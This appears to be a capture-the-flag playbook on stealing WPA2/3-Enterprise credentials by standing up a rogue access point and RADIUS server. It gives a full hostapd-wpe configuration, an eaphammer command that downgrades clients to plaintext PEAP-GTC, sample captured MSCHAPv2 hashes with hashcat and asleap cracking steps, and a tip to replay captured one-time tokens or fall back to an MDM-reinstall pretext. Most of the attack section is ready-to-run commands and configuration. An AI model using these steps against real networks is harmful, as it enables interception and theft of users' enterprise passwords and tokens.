# Rogue-RADIUS EAP flag

## The puzzle shape

The target AP is WPA2/3-Enterprise (RSN AKM 1 or the WPA3-Ent
equivalent). Legitimate clients authenticate via a RADIUS server
using PEAP or EAP-TTLS. The flag is the password a client would
send — or the plaintext token (RSA / Duo / Yubico OTP) it hands
over inside a PEAP tunnel.

## The setup

Stand up a rogue AP + rogue RADIUS. Client with weak cert
validation associates, offers its credentials inside your tunnel,
you log the MSCHAPv2 challenge/response or the GTC plaintext.

## Path A — hostapd-wpe (single-box)

```
# hostapd-wpe drops in as a hostapd replacement — same config +
# extra logging of inner-EAP challenge/response.

hostapd-wpe /etc/hostapd/rogue-enterprise.conf

# Config:
interface=wlan0
ssid=<target ent SSID>
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server-key.pem
```

Watch `/var/log/hostapd-wpe.log`. When a client associates + falls
through, you'll see:

```
username: alice
challenge: <hex>
response: <hex>
jtr NETNTLM: alice:$NETNTLM$…
hashcat: alice::::<challenge>:<response>
```

Feed the hashcat line to `hashcat -m 5500` or `asleap`.

## Path B — eaphammer (higher-level orchestrator)

```
eaphammer --interface wlan0 \
          --essid "<target ent SSID>" \
          --creds \
          --auth wpa-eap \
          --negotiate downgrade   # forces PEAP-GTC where possible
```

`--negotiate downgrade` is the interesting knob: if the client
supports EAP-GTC, eaphammer negotiates it (over PEAP) and the
client sends the token **in plaintext**. The token is often a
one-time OTP; capture it within its validity window and it is
directly usable.

## The flag surface

- **MSCHAPv2 response** — feed to hashcat 5500 / asleap; cracked
  password is the flag.
- **EAP-GTC plaintext** — the flag is the token itself (or the
  password, if the deployment uses static GTC).
- **Cert-phish variant** — the flag is the fact that the client
  associated at all, i.e. the client's User-Name attribute logged
  server-side proves the SSID was reachable and cert validation
  was weak.

## Failure modes

- **EAP-TLS client** — no password to capture. The client wants a
  mutual-cert exchange your rogue can't complete without the CA
  key. Pivot to a captive-portal MDM-reinstall pretext.
- **Strong cert pinning** — client rejects your server cert; no
  inner exchange happens. Nothing to log.

## Cite

- attacks.json: `rogue-radius-hostapd-wpe`,
  `rogue-radius-eaphammer`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-inner-downgrade-peap-gtc`,
  `hashcat-5500-mschapv2-crack`.
- hostapd-wpe README, eaphammer README.
